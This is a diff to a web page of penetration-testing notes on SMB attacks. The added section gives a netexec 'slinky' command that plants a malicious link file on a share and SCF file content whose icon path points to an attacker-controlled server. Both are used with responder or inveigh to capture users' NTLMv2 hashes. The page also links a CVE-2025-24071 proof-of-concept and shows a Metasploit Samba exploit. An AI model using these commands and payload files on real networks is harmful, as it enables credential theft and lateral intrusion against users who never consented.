@@ -147,9 +147,25 @@ get filename #To download a specific file
                     <pre><code class="language-bash">use exploit/multi/samba/usermap_script </code></pre>
                 </ul>    
             
+                <h3>Generating a malicious link file</h3>
+                <ul>
+                    <p>We could be able to generate a malicious link file that when clicked will perform a connection to a malicious server we control. Leading to a NTLMv2 hash disclosure</p>
+                    <pre><code class="language-bash">netexec smb 172.16.139.3 -u username -p password -M slinky -o NAME=document SERVER=172.16.139.35 SHARE=Print_queue</code></pre>
+                    <p>Now use responder or any other tool in order to capture the NTLMv2 hash</p>
+
+                    <p>Is also posible to do the same thing with scf files. Create a file named document.scf and situate the following conetent. Obviously IP must point to the machine where you have the responder or inveigh tool</p>
+                    <pre><code class="language-bash">[Shell]
+Command=2
+IconFile=\\172.16.139.35\share\icon.ico
+[Taskbar]
+Command=ToggleDesktop</code></pre>
+                    
+
+                </ul>
+
                 <h3>Interaction with the user - exploits</h3>
                 <ul>
-                    <p>CVE-2025-24071</p>
+                    <a class="notion-link" href="https://github.com/0x6rss/CVE-2025-24071_PoC">CVE-2025-24071</a>
                 </ul>
 
                 <h3>Smbrelay</h3>
